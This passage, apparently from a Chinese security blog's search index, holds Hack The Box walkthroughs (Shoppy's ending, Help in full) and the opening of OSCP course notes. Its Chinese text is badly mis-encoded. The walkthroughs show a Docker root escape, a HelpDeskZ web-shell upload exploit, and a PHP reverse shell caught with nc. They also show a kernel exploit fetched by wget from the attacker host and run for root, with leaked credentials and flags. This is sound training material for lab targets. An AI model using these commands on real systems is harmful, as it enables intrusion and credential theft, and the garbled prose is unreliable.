std::char_traits<char>, std::allocator<char> >::operator+=(char const*) ; sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::operator_char_const_                                                                                                                                                          \nâ”‚           0x000012f6      488d45a0       lea rax, [var_60h]\nâ”‚           0x000012fa      488d35660d00.  lea rsi, [0x00002067]       ; \"e\"\nâ”‚           0x00001301      4889c7         mov rdi, rax\nâ”‚           0x00001304      e867fdffff     call sym std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> >::operator+=(char const*) ; sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::operator_char_const_\n```\næ¥ç€ï¼Œç¨‹åºä¼šå’Œæˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²å’Œ Sample å­—ç¬¦ä¸€ä¸ªä¸€ä¸ªçš„åšå¯¹æ¯”\n\n```bash\n0x00001325      488d35440d00.  lea rsi, str.Access_granted__Here_is_creds__ ; 0x2070 ; \"Access granted! Here is creds !\"\n0x0000134d      488d3d3c0d00.  lea rdi, str.cat__home_deploy_creds.txt ; 0x2090 ; \"cat /home/deploy/creds.txt\" ; const char *string\n```\næˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²æ˜¯ Sample åï¼Œä¼šè¾“å‡º \"Access granted! Here is creds !\" å­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºæˆ‘ä»¬è¾“å…¥æ­£ç¡®ï¼Œç„¶åä¼šæ‰§è¡Œä¸€ä¸ªç³»ç»Ÿå‘½ä»¤ \"cat /home/deploy/creds.txt\"ï¼ŒæŸ¥çœ‹æ–‡ä»¶ /home/deploy/creds.txt çš„å†…å®¹ã€‚\n\nç°åœ¨æˆ‘ä»¬å›åˆ°é¶æœºï¼Œæ¥æ‰§è¡Œä¸€ä¸‹\n\n```bash\njaeger@shoppy:/home/deploy$ sudo -u deploy ./password-manager\n[sudo] password for jaeger: \nWelcome to Josh password manager!\nPlease enter your master password: Sample\nAccess granted! Here is creds !\nDeploy Creds :\nusername: deploy\npassword: Deploying@pp!\n```\nå¾—åˆ°äº†ä¸€ä¸ªè´¦å·å¯†ç ï¼Œç„¶åä½¿ç”¨è¿™ä¸ªè´¦å·å¯†ç åˆ‡æ¢åˆ°ç”¨æˆ· deploy\n\n```bash\njaeger@shoppy:/home/deploy$ su deploy\nPassword: \n$ whoami&&id\ndeploy\nuid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)\n```\næˆåŠŸææƒåˆ° deploy ç”¨æˆ·\n\n## Docker è¶Šæƒ\n> [https://gtfobins.github.io/gtfobins/docker/](https://gtfobins.github.io/gtfobins/docker/)\n\n> æŸ¥è¯¢ææƒå¸®åŠ©\n\n![image](Hackthebox-Shoppy/8bG08PtQP0JeDHKrF9xon1QswWhY2CQlAiZuN0OKAzA.png)\n\næˆ‘ä»¬å°è¯•ä¸€ä¸‹æ˜¯å¦å¯è¡Œ\n\n```bash\ndocker run -v /:/mnt --rm -it alpine chroot /mnt sh\n```\n```bash\n$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh  \n# whoami&&id\nroot\nuid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)\n```\næˆåŠŸè¶Šæƒåˆ° root æƒé™\n\n```bash\n# cat /root/root.txt\ne95c041905b2bb2a8fcbb6d9327e9d64\n```\næˆåŠŸæ‹¿åˆ° root æƒé™çš„ flag æ–‡ä»¶","tags":["Hackthebox"]},{"title":"Help - Hackthebox","url":"/2022/09/05/Hackthebox/Easy/Hackthebox-Help/","content":"\n# Hackthebox - Help\n# é¶åœºä¿¡æ¯\n![](Hackthebox-Help/cf4c49c4-a97c-44da-b0fc-1a3d55516bbb.png)\n\n# é¶åœºç±»å‹\n![](Hackthebox-Help/bf387b14-d774-411a-802a-c102eed009f2.png)\n\n# ä¿¡æ¯æ”¶é›†\n## Nmap\n```bash\nâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop]\nâ””â”€# nmap -sS -sC -sV -A -p- --min-rate 5000 10.10.10.121\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-07-01 09:14 CST\nNmap scan report for 10.10.10.121\nHost is up (0.35s latency).\nNot shown: 65532 closed tcp ports (reset)\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA)\n|   256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA)\n|_  256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519)\n80/tcp   open  http    Apache httpd 2.4.18\n|_http-title: Did not follow redirect to http://help.htb/\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n3000/tcp open  http    Node.js Express framework\n|_http-title: Site doesn't have a title (application/json; charset=utf-8).\nAggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.16 (95%), Linux 3.18 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.1 (93%), Linux 3.2 (93%), Linux 3.10 - 4.11 (93%), DD-WRT (Linux 3.18) (93%), Linux 4.10 (93%), Linux 4.2 (93%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 1720/tcp)\nHOP RTT       ADDRESS\n1   349.63 ms 10.10.14.1\n2   349.25 ms 10.10.10.121\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 55.59 seconds\n```\n## Http\n![](Hackthebox-Help/f9f452a5-ebd8-49dd-abeb-ed67d289194e.png)\n\nç›´æ¥è®¿é—®ä¼šè¢«è·³è½¬åˆ° htlp.htb å»åŠ ä¸€ä¸ª hosts\n\n```bash\necho 10.10.10.121 help.htb >> /etc/hosts\n```\n![](Hackthebox-Help/75a9bf99-347f-4667-9efd-dbaea725dd1f.png)\n\nç°åœ¨å¯ä»¥è®¿é—®äº†ï¼Œä¸è¿‡æ˜¯ apache2 çš„é»˜è®¤ç•Œé¢ï¼Œå» fuzz ä¸€ä¸‹\n\n### Fuzz\n```bash\nâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop]\nâ””â”€# gobuster dir -u http://help.htb/ --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 200 --no-error\n===============================================================\nGobuster v3.1.0\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://help.htb/\n[+] Method:                  GET\n[+] Threads:                 200\n[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.1.0\n[+] Timeout:                 10s\n===============================================================\n2022/09/04 20:36:06 Starting gobuster in directory enumeration mode\n===============================================================\n/javascript           (Status: 301) [Size: 309] [--> http://help.htb/javascript/]\n/support              (Status: 301) [Size: 306] [--> http://help.htb/support/]   \n/server-status        (Status: 403) [Size: 296]                                  \n\n===============================================================\n2022/09/04 20:37:41 Finished\n===============================================================\n```\næœ‰ä¸€ä¸ª support ç›®å½•ï¼Œè®¿é—®ä¸€ä¸‹\n\n![](Hackthebox-Help/53d8d61c-ec33-4116-ab6f-ee458b65615b.png)\n\næ˜¯ä¸€ä¸ªç™»å½•é¡µé¢ï¼Œå¹¶ä¸”å¯ä»¥ç¡®å®šæ¡†æ¶ä¸º helpdeskz\n\n```bash\nâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop]\nâ””â”€# searchsploit helpdeskz \n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                                                                                                                            |  Path\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nHelpDeskZ 1.0.2 - Arbitrary File Upload                                                                                                                                                                   | php/webapps/40300.py\nHelpDeskZ < 1.0.2 - (Authenticated) SQL Injection / Unauthorized File Download                                                                                                                            | php/webapps/41200.py\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\n```\nå¯ä»¥çœ‹åˆ°æœ‰ä¸¤ä¸ªæ¼æ´ï¼Œåˆ†åˆ«æ˜¯ 1.0.2 ç‰ˆæœ¬çš„ä»»æ„æ–‡ä»¶ä¸Šä¼ ä»¥åŠ 1.0.2 ç‰ˆæœ¬ä»¥ä¸‹çš„ sql æ³¨å…¥ï¼Œä½†æ˜¯æˆ‘ä»¬æ— æ³•ç¡®å®šå½“å‰ cms çš„ç‰ˆæœ¬å·\n\n```bash\nâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop]\nâ””â”€# curl http://help.htb/support/README.md\n![](Hackthebox-Help//images/logo.png)\n\nVersion: 1.0.2 from 1st June 2015<br>\nDeveloped by: Evolution Script S.A.C.<br>\n[Help Desk Software HelpDeskZ](http://www.helpdeskz.com)\n\nHelpDeskZ is a free PHP based software which allows you to manage your site's support with a web-based support ticket system.\n\n## Requirements\n\nHelpDeskZ requires:\n\n- PHP 5.x\n- MySQL database\n- GD Library (only for captcha verification)\n- Mod_rewrite (only if you want to use permalinks)-\n\n## Upgrading\n\nTo upgrade your HelpDeskZ from previous versions, please read the file UPGRADING.txt\n\n## Installation steps\n\n- Connect with FTP to the <em>public folder</em> of your server where the rest of your Web site is\n- Create a new folder where you will install HelpDeskZ. Name it anything you like, for example \"helpdesk\" or \"support\".<br>\nExample: /public_html/support<br>\nCorresponding URL: http://www.site.com/support\n- Upload all HelpDeskZ files to your server.\n- Open **/install** in your browser, for example (modify to your URL):<br />\nhttp://www.site.com/support/install\n- The HelpDeskZ setup script will run. Click <strong>INSTALL HELPDESKZ</strong> and follow the instructions through License agreement, Check Setup and Database settings.\n- Before closing the install script **DELETE the \"install\" directory from your server!**\n- Now it's time to setup your help desk! Open the <strong>staff</strong> panel in your browser, for example:<br />\nhttp://www.site.com/support/?v=staff<br />\nUse the login details that you entered in the installation process.\n- Go to <strong>Settings -> General</strong> to get to the settings page.\n- Take some time and get familiar with all of the available settings. Most of them should be self-explanatory.\n- If you want to use permalinks like http://www.site.com/support/staff/ then you have to enable this option on Settings -> General -> Helpdesk -> Use SEO-friendly URLs\n- Good luck using HelpDeskZ!\n- \n## Email Piping\nHelpDeskZ supports email piping, this allows the auto-creation of tickets from incoming emails to a set email address.\n- To enable email piping for your help desk follow this <a href=\"http://www.helpdeskz.com/help/knowledgebase/2/article/10/setting-up-email-piping\">email piping tutorial.</a>\n\n## Customize the look\nFor detailed information please see this <a href=\"http://www.helpdeskz.com/help/knowledgebase/2/article/6/how-do-i-customize-helpdeskz-look\">knowledgebase article.</a>\n\n## Translate HelpDeskZ to your language\nTo translate HelpDeskZ read <a href=\"http://www.helpdeskz.com/help/knowledgebase/2/article/8/how-can-i-translate-helpdeskz\">How can I translate HelpDeskZ.</a>\n```\né€šè¿‡ README.md å¾—çŸ¥å½“å‰ç‰ˆæœ¬ä¸º 1.0.2\n\næ ¹æ®æ¼æ´ï¼Œå½“å‰åº”è¯¥æ˜¯å¯ä»¥ç›´æ¥è¿›è¡Œ sql æ³¨å…¥å°è¯•çš„ï¼Œä¸è¿‡å’±ä»¬å†çœ‹çœ‹æ›´å¤šæ€è·¯\n\n## 3000 ç«¯å£\n![](Hackthebox-Help/be2f7cf8-3462-4877-a5b9-c6b006fe0920.png)\n\nè¿™è¾¹æœ‰ä¸ª 3000 ç«¯å£å¯ä»¥è®¿é—®\n\n```bash\n\"Hi Shiv, To get access please find the credentials with given query\"\n```\nè¿™æç¤ºæˆ‘ä»¬ï¼Œæƒ³è¦è·å¾—æƒé™ï¼Œéœ€è¦é€šè¿‡ç»™å®šçš„æŸ¥è¯¢æ‰¾åˆ°ç­”æ¡ˆ\n\n```bash\nâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop]\nâ””â”€# dirsearch -u \"http://10.10.10.121:3000\"       \n\n  _|. _ _  _  _  _ _|_    v0.4.2\n (_||| _) (/_(_|| (_| )\n\nExtensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927\n\nOutput File: /root/.dirsearch/reports/10.10.10.121-3000/_22-07-01_09-29-39.txt\n\nError Log: /root/.dirsearch/logs/errors-22-07-01_09-29-39.log\n\nTarget: http://10.10.10.121:3000/\n\n[09:29:40] Starting: \n[09:33:40] 400 -   18B  - /graphql/                                         \n[09:33:40] 400 -   18B  - /graphql/console/\n[09:33:40] 400 -   18B  - /graphql                                          \n\nTask Completed\n```\næ‰¾åˆ°äº†ä¸€ä¸ª /graphql ç›®å½•ï¼Œè¿™ä¸ªç›®å½•ä¸‹è¿˜æœ‰ä¸€ä¸ª /console ç›®å½•ï¼Œå»è®¿é—®ä¸€ä¸‹\n\n![](Hackthebox-Help/6995cd39-bb36-4b5b-a7c2-52c5f29af255.png)\n\nè¿™è¾¹æç¤ºéœ€è¦ä¸€ä¸ª get å‚æ•° query\n\n![](Hackthebox-Help/7bf17396-814b-4c47-84d2-cc3ea7ab1fdc.png)\n\néšä¾¿åŠ ä¸€ä¸ªå‚æ•°åå€’æ˜¯å‡ºæ¥æ•°æ®äº†ï¼Œä½†æ˜¯æç¤ºè¯­æ³•é”™è¯¯ï¼Œå»æ‰¾ä¸€ä¸‹queryç›¸å…³çš„åŠŸèƒ½\n\n![](Hackthebox-Help/2324c19f-f59c-485b-9127-eee4817e4073.png)\n\næ‰¾åˆ°ç›¸å…³çš„åˆ©ç”¨æ–¹å¼ï¼Œç„¶åè¯»å–åˆ°äº†ä¸€ä¸ªè´¦å·å¯†ç \n\n# æ¼æ´åˆ©ç”¨\n![](Hackthebox-Help/eee7ea28-ca2f-4d5a-ae47-b7dfae60f84a.png)\n\nå¾—åˆ°è§£å¯†åçš„è´¦å·å¯†ç \n\n```bash\nusername = helpme@helpme.com\npassword = godhelpmeplz\n```\n![](Hackthebox-Help/582b25b2-d598-4188-abcd-77f4ffc8ac27.png)\n\nåœ¨ 80 ç«¯å£æˆåŠŸç™»å½•\n\n![](Hackthebox-Help/6959207b-6185-4551-a699-deb49f023f59.png)\n\næŠŠæ—¶åŒºä¿®æ”¹ä¸ºæˆ‘ä»¬å½“å‰ç¯å¢ƒçš„æ—¶åŒº\n\n![](Hackthebox-Help/ec95c9d8-0112-4cf7-844f-7037ad2f886e.png)\n\nåœ¨ Submit a Ticket ä¸­å°è¯•ä¸Šä¼ ä¸€ä¸ª php æ–‡ä»¶\n\n![](Hackthebox-Help/8f647a18-4501-4874-b67c-ad9af62da5e5.png)\n\nè¿™é‡Œæç¤ºä¸Šä¼ å¤±è´¥ï¼Œä½†æ˜¯å…¶å®æ˜¯æˆåŠŸçš„ï¼Œä¸è¿‡ä¼šè¢«ä¿®æ”¹ä¸ºéšæœºæ–‡ä»¶åï¼Œæ‰¾åˆ°å°±å¯ä»¥äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜æ˜¯å»åˆ©ç”¨è„šæœ¬å§\n\n```bash\nâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop]\nâ””â”€# python2 40300.py http://help.htb/support/uploads/tickets/ 1.php\nHelpdeskz v1.0.2 - Unauthenticated shell upload exploit\nfound!\nhttp://help.htb/support/uploads/tickets/9d831815c3faa6a961d01bd9dc543aca.php\n```\nä¸Šä¼ æˆåŠŸï¼Œå»å°è¯•è®¿é—®çœ‹çœ‹\n\n![](Hackthebox-Help/dfb3d676-97cc-4c82-96fa-fe07fc4cef6a.png)\n\næˆåŠŸä¸Šä¼ å¹¶ä¸”è®¿é—®æˆåŠŸï¼Œå»åˆ¶ä½œä¸€ä¸ª php çš„ revershell\n\n> [https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)\n\nç„¶åå»ç½‘é¡µç«¯ä¸Šä¼ ï¼Œæ¥ç€ä½¿ç”¨ nc ç›‘å¬ä¸€ä¸ªç«¯å£ï¼Œç„¶åè¿è¡Œ exploit\n\n```bash\nâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop]\nâ””â”€# python2 40300.py http://help.htb/support/uploads/tickets/ phpshell.php\nHelpdeskz v1.0.2 - Unauthenticated shell upload exploit\n```\n```bash\nâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop]\nâ””â”€# nc -nvlp 4444\nlistening on [any] 4444 ...\nconnect to [10.10.14.9] from (UNKNOWN) [10.10.10.121] 35558\nLinux help 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux\n 19:41:30 up 1 day,  9:53,  0 users,  load average: 0.00, 0.00, 0.00\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\nuid=1000(help) gid=1000(help) groups=1000(help),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare)\n/bin/sh: 0: can't access tty; job control turned off\n$ python -c \"import pty;pty.spawn('/bin/bash')\";\nhelp@help:/$ id&&whoami\nid&&whoami\nuid=1000(help) gid=1000(help) groups=1000(help),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare)\nhelp\n```\næˆåŠŸå¼¹å› shel\n\n```bash\ncat user.txt\n64cf57c35b4e6991534e125790ad0b55\n```\næˆåŠŸæ‹¿åˆ° user æƒé™çš„ flag æ–‡ä»¶\n\n# æƒé™æå‡\né¦–å…ˆä½¿ç”¨ python å¼€å¯ä¸€ä¸ª http æœåŠ¡å™¨ï¼Œç„¶åä¸Šä¼ ä¸€ä¸ª linpeas ææƒè¾…åŠ©è„šæœ¬\n\n```bash\n                                                                                 â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—\nâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£ Basic information â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•                                                                                                                                     \n                                         â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•                                                                                                                                                                              \nOS: Linux version 4.4.0-116-generic (buildd@lgw01-amd64-021) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.9) ) #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018\nUser & Groups: uid=1000(help) gid=1000(help) groups=1000(help),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare)\nHostname: help\nWritable folder: /dev/shm\n[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)\n[+] /bin/nc is available for network discover & port scanning (linpeas can discover hosts and scan ports, learn more with -h)                                                                                                               \n\n\nCaching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE\n```\nè¿™è¾¹çœ‹åˆ°äº†ç³»ç»Ÿç‰ˆæœ¬æ˜¯ ubuntu 4.40ï¼Œå»æœç´¢ä¸‹æ˜¯å¦æœ‰æ¼æ´\n\n```bash\nâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop]\nâ””â”€# searchsploit 4.4.0-116\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                                                                                                                            |  Path\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nLinux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                                                                                                                                    | linux/local/44298.c\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\n```\næ‰¾åˆ°ä¸€ä¸ª ä¼ åˆ°æœåŠ¡å™¨å»ï¼Œç„¶åç¼–è¯‘è¿è¡Œ\n\n```bash\nhelp@help:/tmp$ wget http://10.10.14.9/44298.c\nwget http://10.10.14.9/44298.c\n--2022-09-04 20:40:43--  http://10.10.14.9/44298.c\nConnecting to 10.10.14.9:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 5773 (5.6K) [text/x-csrc]\nSaving to: '44298.c'\n\n44298.c             100%[===================>]   5.64K  --.-KB/s    in 0s      \n\n2022-09-04 20:40:43 (20.3 MB/s) - '44298.c' saved [5773/5773]\n```\nä¼ è¾“è¿›æ¥ä»¥åï¼Œå»è¿›è¡Œç¼–è¯‘\n\n```bash\nhelp@help:/tmp$ gcc 44298.c -o exploit \ngcc 44298.c -o exploit\n```\næ¥ç€è¿è¡Œ\n\n```bash\nhelp@help:/tmp$ ./exploit\n./exploit\ntask_struct = ffff880037ee8000\nuidptr = ffff880036f91084\nspawning root shell\nroot@help:/tmp# whoami&&id\nwhoami&&id\nroot\nuid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare),1000(help)\n```\n```bash\nroot@help:/root# cat root.txt\ncat root.txt\n9123b571740b6f2c3b1a7fa657c55f20\n```\næˆåŠŸæ‹¿åˆ° root æƒé™çš„ flag æ–‡ä»¶","tags":["Hackthebox"]},{"title":"OSCPéšç¬”","url":"/2022/08/06/OSCP/OSCPéšç¬”/","content":"\n# OSCP - PWK\n\n------\n\n# ä½¿ç”¨Kali Linuxè¿›è¡Œæ¸—é€æµ‹è¯•:ä¸€èˆ¬è¯¾ç¨‹ä¿¡æ¯\n\næ¬¢è¿æ¥åˆ° Kali Linux çš„æ¸—é€æµ‹è¯•(PWK)è¯¾ç¨‹!\n\nPWK æ˜¯ä¸ºé‚£äº›æƒ³åœ¨ä¸“ä¸šæ¸—é€æµ‹è¯•é¢†åŸŸè¿ˆå‡ºä¸¥è‚ƒè€Œæœ‰æ„ä¹‰çš„ä¸€æ­¥çš„ç³»ç»Ÿå’Œç½‘ç»œç®¡ç†å‘˜ä»¥åŠå®‰å…¨ä¸“å®¶è€Œè®¾ç«‹çš„ã€‚æœ¬è¯¾ç¨‹å°†å¸®åŠ©ä½ æ›´å¥½åœ°äº†è§£æ¶æ„å®ä½“å¯¹ç½‘ç»œçš„æ”»å‡»å’ŒæŠ€æœ¯ã€‚æ­å–œä½ è¿ˆå‡ºäº†ç¬¬ä¸€æ­¥ã€‚æˆ‘ä»¬å¾ˆé«˜å…´ä½ åœ¨è¿™é‡Œã€‚\n\n## å…³äº PWK è¯¾ç¨‹\n\nè®©æˆ‘ä»¬èŠ±ç‚¹æ—¶é—´æ¥å›é¡¾ä¸€ä¸‹è¯¾ç¨‹æœ¬èº«å’Œå®ƒçš„æ¯ä¸€ä¸ªç»„æˆéƒ¨åˆ†ã€‚ä½ ç°åœ¨åº”è¯¥å¯ä»¥è®¿é—®ä»¥ä¸‹å†…å®¹ï¼š\n\n- PWKè¯¾ç¨‹ææ–™\n- æ¥å…¥å†…éƒ¨VPNå®éªŒå®¤ç½‘ç»œ\n- Offensive Security å­¦ç”Ÿè®ºå›\n- å®æ—¶æ”¯æŒ\n- OSCPè€ƒè¯•çš„å°è¯•\n\nè®©æˆ‘ä»¬é€ä¸€å›é¡¾è¿™äº›é¡¹ç›®ã€‚\n\n### PWK è¯¾ç¨‹ææ–™\n\nè¯¥è¯¾ç¨‹åŒ…æ‹¬PDFæ ¼å¼çš„å®éªŒæŒ‡å—å’Œé…å¥—çš„è¯¾ç¨‹è§†é¢‘ã€‚PDFå’Œè§†é¢‘ä¸­æ¶µç›–çš„ä¿¡æ¯æ˜¯é‡å çš„ï¼Œè¿™æ„å‘³ç€ä½ å¯ä»¥å…ˆé˜…è¯»å®éªŒæŒ‡å—ï¼Œç„¶åè§‚çœ‹è§†é¢‘æ¥å¡«è¡¥ä»»ä½•ç©ºç™½ï¼Œåä¹‹äº¦ç„¶ã€‚åœ¨æŸäº›æ¨¡å—ä¸­ï¼Œå®éªŒæŒ‡å—æ¯”è§†é¢‘æ›´è¯¦ç»†ã€‚åœ¨å…¶ä»–æƒ…å†µä¸‹ï¼Œè§†é¢‘å¯èƒ½æ¯”æŒ‡å—æ›´èƒ½ä¼ è¾¾ä¸€äº›ä¿¡æ¯ã€‚é‡è¦çš„æ˜¯ï¼Œä½ è¦å¯†åˆ‡æ³¨æ„è¿™ä¸¤æ–¹é¢çš„å†…å®¹ã€‚\n\nå®éªŒæŒ‡å—åœ¨æ¯ä¸€ç« çš„æœ«å°¾è¿˜åŒ…å«ç»ƒä¹ ã€‚ å®Œæˆè¯¾ç¨‹ç»ƒä¹ å°†å¸®åŠ©ä½ åœ¨å°è¯•å‘ç°å’Œåˆ©ç”¨å®éªŒå®¤æœºå™¨ä¸­çš„æ¼æ´æ—¶å˜å¾—æ›´æœ‰æ•ˆç‡ã€‚\n\n### æ¥å…¥å†…éƒ¨ VPN å®éªŒå®¤ç½‘ç»œ\n\nä½ åœ¨å¼€è¯¾æ—¥æ”¶åˆ°çš„ç”µå­é‚®ä»¶æ¬¢è¿åŒ…ä¸­åŒ…æ‹¬ä½ çš„VPNè¯ä¹¦å’Œç›¸åº”çš„VPNè¿æ¥åŒ…ã€‚è¿™äº›å°†ä½¿æ‚¨èƒ½å¤Ÿè®¿é—®å†…éƒ¨VPNå®éªŒå®¤ç½‘ç»œï¼Œæ‚¨å°†åœ¨é‚£é‡ŒèŠ±è´¹å¤§é‡çš„æ—¶é—´ã€‚\n\nå®éªŒæ—¶é—´ä»æ‚¨çš„è¯¾ç¨‹å¼€å§‹æ—¶å¼€å§‹ï¼Œå¹¶ä»¥è¿ç»­è®¿é—®çš„æ–¹å¼è®¡é‡ã€‚å®éªŒå®¤æ—¶é—´åªæœ‰åœ¨ç´§æ€¥æƒ…å†µä¸‹æ‰å¯ä»¥æš‚åœã€‚$^1$\n\nå¦‚æœä½ çš„å®éªŒæ—¶é—´è¿‡æœŸæˆ–å³å°†è¿‡æœŸï¼Œä½ å¯ä»¥åœ¨ä»»ä½•æ—¶å€™è´­ä¹°å®éªŒå»¶æœŸã€‚è¦è´­ä¹°é¢å¤–çš„å®éªŒå®¤æ—¶é—´ï¼Œè¯·ä½¿ç”¨å‘é€åˆ°ä½ çš„ç”µå­é‚®ä»¶åœ°å€çš„ä¸ªæ€§åŒ–è´­ä¹°é“¾æ¥ã€‚å¦‚æœä½ åœ¨å®éªŒå®¤è®¿é—®ä»ç„¶æœ‰æ•ˆæ—¶è´­ä¹°å®éªŒå®¤å»¶æœŸï¼Œä½ å¯ä»¥ç»§ç»­ä½¿ç”¨ç›¸åŒçš„VPNè¿æ¥åŒ…ã€‚ å¦‚æœä½ åœ¨ç°æœ‰çš„å®éªŒå®¤è®¿é—®ç»“æŸåè´­ä¹°å®éªŒå®¤å»¶æœŸï¼Œä½ å°†æ”¶åˆ°ä¸€ä¸ªæ–°çš„VPNè¿æ¥åŒ…ã€‚\n\n### Offensive Security å­¦ç”Ÿè®ºå›\n\nå­¦ç”Ÿè®ºå›$^2$åªæœ‰ Offensive Security ä¸“ä¸šçš„å­¦ç”Ÿæ‰èƒ½è¿›å…¥ã€‚ä½ çš„è®ºå›å‡­è¯ä¹Ÿæ˜¯ç”µå­é‚®ä»¶æ¬¢è¿åŒ…çš„ä¸€éƒ¨åˆ†ã€‚è®¿é—®æƒä¸ä¼šå› ä¸ºä½ çš„å®éªŒæ—¶é—´ç»“æŸè€Œè¿‡æœŸã€‚åœ¨ä½ é€šè¿‡OSCPè€ƒè¯•åï¼Œä½ å¯ä»¥ç»§ç»­äº«å—è®ºå›ã€‚\n\nåœ¨è®ºå›ä¸Šï¼Œä½ å¯ä»¥æå‡ºé—®é¢˜ï¼Œåˆ†äº«æœ‰è¶£çš„èµ„æºï¼Œå¹¶æä¾›æç¤ºï¼ˆåªè¦æ²¡æœ‰ç ´åæ€§çš„å†…å®¹ï¼‰ã€‚æˆ‘ä»¬è¦æ±‚æ‰€æœ‰çš„è®ºå›æˆå‘˜æ³¨æ„ä»–ä»¬æ‰€å‘å¸ƒçš„å†…å®¹ï¼Œç‰¹åˆ«æ³¨æ„ä¸è¦å› ä¸ºå‘å¸ƒå®Œæ•´çš„è§£å†³æ–¹æ¡ˆè€Œç ´åä»–äººçš„æ•´ä½“è¯¾ç¨‹ä½“éªŒã€‚ä¸å‘¨åˆ°çš„å¸–å­å¯èƒ½ä¼šè¢«å®¡æ ¸ã€‚\n\né™¤äº†æ¥è‡ªå…¶ä»–å­¦ç”Ÿçš„å¸–å­å¤–ï¼Œä½ è¿˜ä¼šå‘ç°ä¸€äº›é¢å¤–çš„èµ„æºï¼Œå¯ä»¥å¸®åŠ©æ¾„æ¸…è¯¾ç¨‹ä¸­æå‡ºçš„æ¦‚å¿µã€‚ è¿™äº›èµ„æºåŒ…æ‹¬å®éªŒå®¤æœºå™¨å­é›†çš„è¯¦ç»†æ¼”ç»ƒã€‚ è¿™äº›æ¼”ç»ƒçš„ç›®çš„æ˜¯è¯´æ˜å®ç°æœ€ä½³ç»“æœæ‰€éœ€çš„æ€ç»´æ–¹å¼å’Œæ–¹æ³•ã€‚\n\nä¸€æ—¦ä½ æˆåŠŸé€šè¿‡ OSCP è€ƒè¯•ï¼Œä½ å°†è·å¾—è¿›å…¥è¯ä¹¦æŒæœ‰è€…åˆ†è®ºå›çš„æƒé™ã€‚\n\n### 